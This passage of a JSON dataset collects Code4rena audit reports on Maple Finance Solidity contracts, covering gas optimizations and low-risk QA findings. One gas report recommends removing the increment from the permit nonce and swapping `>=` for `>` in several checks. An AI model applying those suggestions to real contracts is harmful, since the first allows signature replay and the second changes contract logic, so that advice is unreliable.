contracts.\n\n```\nhttps://github.com/maple-labs/erc20/blob/main/contracts/ERC20.sol#L119\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nAn elegant solution that you may consider applying is from Sushi Trident: https://github.com/sushiswap/trident/blob/concentrated/contracts/pool/concentrated/TridentNFT.sol#L47-L62\n\n# C4-010 : # Current Allowance Is Not Checked\n\n## Impact - LOW\n\nDuring the ERC20 implementation, It has been observed that allowance check is not implemented over the functions. That can cause unintended revert on the functions.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/maple-labs/erc20/blob/main/contracts/ERC20.sol#L65\n\nhttps://github.com/maple-labs/erc20/blob/main/contracts/ERC20.sol#L157\n\n\n```\n\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider implementing allowance check in the related functions.  (https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)\n\n```\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/39"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "#1 Using mutiple require instead of using operator `&&`  for saving gas\n\ninstead of using operator && on single require check. using mutiple require check can save more gas.\n\nPOC it can be seen from this report here :\n\nhttps://github.com/code-423n4/2022-01-timeswap-findings/issues/89\n\n## Tool Used\n\nremix\n\n## Mitigation Step \n\noccurence :\n```\nERC20.sol #L101\nMappleloan.sol #L233\n\ne.g:\n\n```\n\n```\n            require(recoveredAddress == owner_ && owner_ != address(0), \"ERC20:P:INVALID_SIGNATURE\");\n```\n\nchange to\n\n```\n            require(recoveredAddress == owner_, \"ERC20:P:INVALID_SIGNATURE\"); \n            require(owner_ != address(0), \"ERC20:P:INVALID_SIGNATURE\");\n```\n\n\n\n\n#2. Using nonces[owner_] can saving more gas\n\nhttps://github.com/maple-labs/erc20/blob/main/contracts/ERC20.sol#L92\n\nit can be simplified using `nonces[owner_]` instead of using `nonces[owner_]++` and saving more gas for deploy but it would be decreasing the nonce.\n\n##Tool Used \n\nManual Review / Remix\n\n##Mitigation Step\n\nRemove ++\n\n#3. using > instead of >= \n\ninstead of using `>=` it can be use `>` so this implementation can saving more gas.\n\n##Recommended Mitigation Step\n\nchange >= into >\n\n##Occurance\n\n```\nxMPL.sol #58\nERC20.sol #L76\nMapleloan.sol #116\n```\n\n#4.unused `_transfer` & `_approve` in internal function and change into external for saving more gas\n\nhttps://github.com/maple-labs/erc20/blob/main/contracts/ERC20.sol\n\nin solmate ERC20 internal function was used for only mint and burning logic, but in ERC20.sol was used approve and transfer. but it can be the same solmate ERC20 implementation for saving more gas\n\n##POC\nhttps://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC20.sol\n\t\n## Tool Used \n\nManual Review / Remix.  \n\n## Recommended Mitigation Step\n\nE.x :\n\nRemove _transfer from internal function and use this instead \n\n```\n    function transfer(address to, uint256 amount) external override returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n``` \n\n#5. State variables can be set as immutable\n\nin the following file xMPL.sol, variable that could be set immutable to save gas\n\n##Tool used\n\nManual Review\n\n## Mitigation Step\nadd Immutable \n\n```\nxMPL.sol scheduledMigrator  \nxML.sol scheduledNewAsset\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/36"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Adding Payable Keyword to Constructor\n**Context**\n[ERC20.sol](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol), [Migrator.sol](https://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/Migrator.sol), [xMPL.sol](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol), [RevenueDistributionToken.sol](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol).\n\n**Description**\nMaking the ```constructor()``` payable eliminates the need for an initial check of msg.value == 0 and saves 21 gas. This shouldn't not increase security risk and the savings is on deployment.\n\n**Recommendation** \nAdd payable keyword to ```constructors()```\n\n\n## Catching The Array Length Prior To Loop.\n**Context**\n[MapleLoanInternals.sol](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol).\n\n**Description**\nOne can save gas by caching the array length (in stack) and using that set variable in the loop. This can be done for the function [_acceptNewTerms()](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L229).\n\n**Recommendation** \nSimply do something like so before the for loop: ```uint length = calls_.length```. Then add ```length``` in place of ```calls_.length``` in the for loop.\n\n\n## Function Ordering via Method ID\n**Context**\n[All contracts](https://github.com/code-423n4/2022-03-maple).\n\n**Description**\nMost called functions could save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [This tool](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.\n\n**Recommendation** \nFind a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas.\n\n\n## Setting State Variable To Local Variable And Using Keyword delete\n**Context**\n[MapleLoanInternals.sol](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol) and [xMPL.sol](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol).\n\n**Description**\nSeveral functions are clearing state variables by setting them to ```=uint256(0)```. To make these cheaper you could set the state variables to local variables within the function and then use the delete keyword to set them to their initial value.\nIn ```MapleLoanInternals.sol``` there are:\n[_clearLoanAccounting()](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L63), [_repossess()](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L358), [_closeLoan()](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L143) and [_makePayment()](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L172).\n\n\nIn ```xMPL.sol``` there is:\n[_cleanupMigration()](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L91) which uses the ```delete``` keyword but do so to the state variable directly and it would be cheaper to set the state variables to local variables and then use ```delete```.\n\n[scheduleMigration()](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L76) just setting the state variable and then using them to save gas.\n\n**Recommendation** \nSet the state variables to local variables within the function and then use the delete keyword to set them to their initial value.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/34"
    }
  },
  {
    "title": "QA Report",
    "body": "## [L] `ERC20.sol` Unconventional implementation of `transfer()`, `transferFrom()`\n\nThere is no `require(recipient_ != address(0), \"...\")`, so that `transfer(address(0), amount_)`, `transferFrom(from, address(0), amount_)` can be used to burn tokens without decreasing the `totalSupply`.\n\nWhich mean `Transfer(owner_, 0, amount_)` may not be triggered by `_burn()`.\n\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L104-L113\n\n```solidity\n    function transfer(address recipient_, uint256 amount_) external override returns (bool success_) {\n        _transfer(msg.sender, recipient_, amount_);\n        return true;\n    }\n\n    function transferFrom(address owner_, address recipient_, uint256 amount_) external override returns (bool success_) {\n        _approve(owner_, msg.sender, allowance[owner_][msg.sender] - amount_);\n        _transfer(owner_, recipient_, amount_);\n        return true;\n    }\n```\n\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L157-L164\n\n```solidity\n    function _transfer(address owner_, address recipient_, uint256 amount_) internal {\n        balanceOf[owner_] -= amount_;\n\n        // Cannot overflow because minting prevents overflow of totalSupply, and sum of user balances == totalSupply.\n        unchecked { balanceOf[recipient_] += amount_; }\n\n        emit Transfer(owner_, recipient_, amount_);\n    }\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/32"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**[S]**: Suggested optimation, save a decent amount of gas without compromising readability;\n\n**[M]**: Minor optimation, the amount of gas saved is minor, change when you see fit;\n\n**[N]**: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [S] `ERC20.sol#transferFrom()` Do not reduce approval on transferFrom if current allowance is type(uint256).max\n\nThe Wrapped Ether (WETH) ERC-20 contract has a gas optimization that does not update the allowance if it is the max uint.\n\nThe latest version of OpenZeppelin's ERC20 token contract also adopted this optimization.\n\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L109-L113\n\n```solidity\n    function transferFrom(address owner_, address recipient_, uint256 amount_) external override returns (bool success_) {\n        _approve(owner_, msg.sender, allowance[owner_][msg.sender] - amount_);\n        _transfer(owner_, recipient_, amount_);\n        return true;\n    }\n```\n\nSee:\n-   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/token/ERC20/ERC20.sol#L336\n-   https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085\n\n### Recommendation\n\nChange to:\n\n```solidity\n    function transferFrom(address owner_, address recipient_, uint256 amount_) external override returns (bool success_) {\n        uint256 currentAllowance = allowance[owner_][msg.sender];\n        if (currentAllowance != type(uint256).max) {\n            _approve(owner_, msg.sender, currentAllowance - amount_);\n        }\n\n        _transfer(owner_, recipient_, amount_);\n        return true;\n    }\n```\n\n## [S] Use immutable variables can save gas\n\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L25-L26\n\n```solidity\n    string public override name;\n    string public override symbol;\n```\n\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L50-L54\n\n```solidity\n    constructor(string memory name_, string memory symbol_, uint8 decimals_) {\n        name     = name_;\n        symbol   = symbol_;\n        decimals = decimals_;\n    }\n```\n\nIn `ERC20.sol`, `name` and `symbol` will never change, use immutable variable instead of storage variable can save gas.\n\n## [M] Validation can be done earlier to save gas\n\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L75-L102\n\n```solidity\n    function permit(address owner_, address spender_, uint256 amount_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_) external override {\n        require(deadline_ >= block.timestamp, \"ERC20:P:EXPIRED\");\n\n        // Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}.\n        require(\n            uint256(s_) <= uint256(0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) &&\n            (v_ == 27 || v_ == 28),\n            \"ERC20:P:MALLEABLE\"\n        );\n\n        // Nonce realistically cannot overflow.\n        unchecked {\n            bytes32 digest = keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner_, spender_, amount_, nonces[owner_]++, deadline_))\n                )\n            );\n\n            address recoveredAddress = ecrecover(digest, v_, r_, s_);\n\n            require(recoveredAddress == owner_ && owner_ != address(0), \"ERC20:P:INVALID_SIGNATURE\");\n        }\n\n        _approve(owner_, spender_, amount_);\n    }\n```\n\nCheck if `owner_ != address(0)` earlier can avoid unnecessary computing when this check failed.\n\n\n### Recommendation\n\nChange to:\n\n```solidity\n    function permit(address owner_, address spender_, uint256 amount_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_) external override {\n        require(deadline_ >= block.timestamp, \"ERC20:P:EXPIRED\");\n        require(owner_ != address(0), \"...\");\n\n        // Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}.\n        require(\n            uint256(s_) <= uint256(0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) &&\n            (v_ == 27 || v_ == 28),\n            \"ERC20:P:MALLEABLE\"\n        );\n\n        // Nonce realistically cannot overflow.\n        unchecked {\n            bytes32 digest = keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner_, spender_, amount_, nonces[owner_]++, deadline_))\n                )\n            );\n\n            address recoveredAddress = ecrecover(digest, v_, r_, s_);\n\n            require(recoveredAddress == owner_, \"ERC20:P:INVALID_SIGNATURE\");\n        }\n\n        _approve(owner_, spender_, amount_);\n    }\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/31"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Non-Critical Findings\n\n### Redundant type cast to `address`\n\n#### Description\n\nVariable `asset` is defined as `address public override asset`, the type casting to `address` is redundant.\n\n#### Findings\n\n[RevenueDistributionToken.sol#L162](https://github.com/maple-labs/revenue-distribution-token/blob/v1.0.0-beta.1/contracts/RevenueDistributionToken.sol#L162)  \n[RevenueDistributionToken.sol#L181](https://github.com/maple-labs/revenue-distribution-token/blob/v1.0.0-beta.1/contracts/RevenueDistributionToken.sol#L181)\n\n#### Recommended mitigation steps\n\nRemove redundant type cast.\n\nFrom:\n\n```solidity\nrequire(ERC20Helper.transfer(address(asset), receiver_, assets_), \"RDT:B:TRANSFER\");\n```\n\nTo:\n\n```solidity\nrequire(ERC20Helper.transfer(asset, receiver_, assets_), \"RDT:B:TRANSFER\");\n```\n\n---\n\n### Open TODOs in code\n\n#### Description\n\nOpen TODOs can hint at programming or architectural errors that still need to be fixed.\n\n#### Findings\n\n[RevenueDistributionToken.sol#L78](https://github.com/maple-labs/revenue-distribution-token/blob/v1.0.0-beta.1/contracts/RevenueDistributionToken.sol#L78)  \n[RevenueDistributionToken.sol#L276](https://github.com/maple-labs/revenue-distribution-token/blob/v1.0.0-beta.1/contracts/RevenueDistributionToken.sol#L276)  \n\n#### Recommended mitigation steps\n\nImplement open TODOs and remove comments.\n\n### `xMPL.performMigration()` is safe to be called by everyone\n\n#### Description\n\n`xMPL.performMigration()` is currently only allowed to be called by the contract owner, but as there are no funds at risk and no downsides to having everyone (public) call the function, the modifier `onlyOwner` can be removed.\n\nIt even states so in the [README](https://github.com/maple-labs/xMPL/blob/v1.0.0-beta.1/README.md):\n\n```\n3. After the time delay, anyone can call `performMigration`, which executes the migration with the parameters set 10 days prior.\n```\n\n#### Findings\n\n[xMPL.performMigration()](https://github.com/maple-labs/xMPL/blob/v1.0.0-beta.1/contracts/xMPL.sol#L51)\n\n#### Recommended mitigation steps\n\nRemove modifier `onlyOwner`.\n\n## Low Risk\n\nNone found.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/21"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Remove unused variables\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [19](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L19))\n```solidity\n    address internal _pendingBorrower;  // The address of the pendingBorrower, the only address that can accept the borrower role.\n```\n2. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [20](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L20))\n```solidity\n    address internal _pendingLender;    // The address of the pendingLender, the only address that can accept the lender role.\n```\n\n### Not using the named return variables when a function returns, wastes deployment gas\n\n1. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [62](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L62))\n```solidity\n        return true;\n```\n2. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [67](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L67))\n```solidity\n        return true;\n```\n3. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [72](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L72))\n```solidity\n        return true;\n```\n4. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [106](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L106))\n```solidity\n        return true;\n```\n5. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [112](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L112))\n```solidity\n        return true;\n```\n6. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (lines [120-128](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L120-L128))\n```solidity\n        return keccak256(\n            abi.encode(\n                keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                block.chainid,\n                address(this)\n            )\n        );\n```\n7. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [249](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L249))\n```solidity\n        return collateralNeeded > currentCollateral ? collateralNeeded - currentCollateral : uint256(0);\n```\n8. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [275](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L275))\n```solidity\n        return IMapleGlobalsLike(IMapleProxyFactory(_factory()).mapleGlobals()).protocolPaused();\n```\n9. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [283](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L283))\n```solidity\n        return _borrower;\n```\n10. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [287](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L287))\n```solidity\n        return _claimableFunds;\n```\n11. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [291](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L291))\n```solidity\n        return _collateral;\n```\n12. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [295](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L295))\n```solidity\n        return _collateralAsset;\n```\n13. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [299](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L299))\n```solidity\n        return _collateralRequired;\n```\n14. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [303](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L303))\n```solidity\n        return _delegateFee;\n```\n15. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [307](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L307))\n```solidity\n        return _drawableFunds;\n```\n16. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [311](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L311))\n```solidity\n        return _earlyFeeRate;\n```\n17. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [315](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L315))\n```solidity\n        return _endingPrincipal;\n```\n18. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [322](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L322))\n```solidity\n        return currentCollateral > collateralNeeded ? currentCollateral - collateralNeeded : uint256(0);\n```\n19. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [326](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L326))\n```solidity\n        return _factory();\n```\n20. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [330](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L330))\n```solidity\n        return _fundsAsset;\n```\n21. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [334](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L334))\n```solidity\n        return _gracePeriod;\n```\n22. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [338](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L338))\n```solidity\n        return _implementation();\n```\n23. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [342](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L342))\n```solidity\n        return _interestRate;\n```\n24. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [346](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L346))\n```solidity\n        return _lateFeeRate;\n```\n25. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [350](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L350))\n```solidity\n        return _lateInterestPremium;\n```\n26. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [354](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L354))\n```solidity\n        return _lender;\n```\n27. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [358](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L358))\n```solidity\n        return _nextPaymentDueDate;\n```\n28. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [362](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L362))\n```solidity\n        return _paymentInterval;\n```\n29. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [366](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L366))\n```solidity\n        return _paymentsRemaining;\n```\n30. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [370](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L370))\n```solidity\n        return _pendingBorrower;\n```\n31. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [374](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L374))\n```solidity\n        return _pendingLender;\n```\n32. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [378](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L378))\n```solidity\n        return _principalRequested;\n```\n33. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [382](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L382))\n```solidity\n        return _principal;\n```\n34. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [386](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L386))\n```solidity\n        return _refinanceCommitment;\n```\n35. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [390](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L390))\n```solidity\n        return _refinanceInterest;\n```\n36. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [395](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L395))\n```solidity\n        return _factory();\n```\n37. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [399](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L399))\n```solidity\n        return _treasuryFee;\n```\n38. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [18](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L18))\n```solidity\n        return abi.encode(borrower_, assets_, termDetails_, amounts_, rates_);\n```\n39. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (lines [205-208](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L205-L208))\n```solidity\n        return _refinanceCommitment =\n            calls_.length > uint256(0)\n                ? _getRefinanceCommitment(refinancer_, deadline_, calls_)\n                : bytes32(0);\n```\n40. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [333](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L333))\n```solidity\n        if (amount_ == uint256(0)) return true;\n```\n41. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [337](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L337))\n```solidity\n        if (!success || data.length == uint256(0)) return false;\n```\n42. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [341](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L341))\n```solidity\n        if (destination == address(0)) return false;\n```\n43. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [343](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L343))\n```solidity\n        return ERC20Helper.transfer(_fundsAsset, destination, amount_);\n```\n44. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [398](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L398))\n```solidity\n        return _collateral >= _getCollateralRequiredFor(_principal, _drawableFunds, _principalRequested, _collateralRequired);\n```\n45. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (lines 